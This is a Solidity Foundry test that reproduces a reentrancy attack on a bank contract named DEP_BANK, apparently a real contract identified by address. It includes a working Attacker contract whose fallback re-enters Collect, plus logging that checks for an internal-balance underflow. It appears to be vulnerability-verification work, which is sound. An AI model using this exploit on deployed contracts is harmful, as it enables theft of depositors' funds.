// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xaae1f51cf3339f18b6d3f3bdc75a5facd744b0b8.sol";

contract ReentrancyTest is Test {
    DEP_BANK bank;
    LogFile logFile;
    Attacker attacker;
    address victim = address(0xdead);
    uint constant VICTIM_DEPOSIT = 1 ether;
    uint constant ATTACKER_DEPOSIT = 1; // 1 wei

    function setUp() public {
        // Deploy contracts
        logFile = new LogFile();
        bank = new DEP_BANK();
        bank.SetLogFile(address(logFile));
        bank.SetMinSum(0); // Allow small withdrawals

        // Victim deposit
        vm.deal(victim, VICTIM_DEPOSIT);
        vm.prank(victim);
        bank.Deposit{value: VICTIM_DEPOSIT}();
        
        // Deploy attacker
        attacker = new Attacker(address(bank));
        vm.deal(address(attacker), ATTACKER_DEPOSIT);
        
        // Attacker deposits funds
        vm.prank(address(attacker));
        attacker.deposit{value: ATTACKER_DEPOSIT}();

        // After deposit, attacker contract balance should be 0
        assertEq(address(attacker).balance, 0);
    }

    function testReentrancyExploit() public {
        console.log("--- BEFORE-Trigger State ---");
        uint attackerBalanceBefore = address(attacker).balance;
        uint bankBalanceBefore = address(bank).balance;
        uint attackerBankBalanceBefore = bank.balances(address(attacker));
        console.log("Attacker contract ETH balance: ", attackerBalanceBefore);
        console.log("Bank contract ETH balance:    ", bankBalanceBefore);
        console.log("Attacker bank internal balance:", attackerBankBalanceBefore);
        console.log("--------------------------------");

        console.log("--- Trigger Attack ---");
        attacker.attack(1); // Attack amount: 1 wei
        console.log("--------------------------------");

        console.log("--- AFTER-Trigger State ---");
        uint attackerBalanceAfter = address(attacker).balance;
        uint bankBalanceAfter = address(bank).balance;
        uint attackerBankBalanceAfter = bank.balances(address(attacker));
        console.log("Attacker contract ETH balance: ", attackerBalanceAfter);
        console.log("Bank contract ETH balance:    ", bankBalanceAfter);
        console.log("Attacker bank internal balance:", attackerBankBalanceAfter);
        console.log("--------------------------------");

        uint attackerProfit = attackerBalanceAfter - attackerBalanceBefore;
        uint bankLoss = bankBalanceBefore - bankBalanceAfter;
        console.log("Attacker profit (ETH gained): ", attackerProfit);

        // Check for underflow condition in bank balance
        bool isVulnerable = (attackerBankBalanceAfter == type(uint256).max);
        
        if (isVulnerable) {
            console.log("Vulnerability Exists: Reentrancy caused internal balance underflow to max uint256");
        } else {
            console.log("Vulnerability not Exist: Internal balance consistency maintained");
        }
    }
}

contract Attacker {
    DEP_BANK bank;
    uint count;
    uint attackAmt;
    
    constructor(address _bank) {
        bank = DEP_BANK(payable(_bank));
    }
    
    function deposit() public payable {
        bank.Deposit{value: msg.value}();
    }
    
    function attack(uint amt) public {
        attackAmt = amt;
        bank.Collect(amt);
    }
    
    fallback() external payable {
        count++;
        if (count <= 1) {
            bank.Collect(attackAmt);
        }
    }
}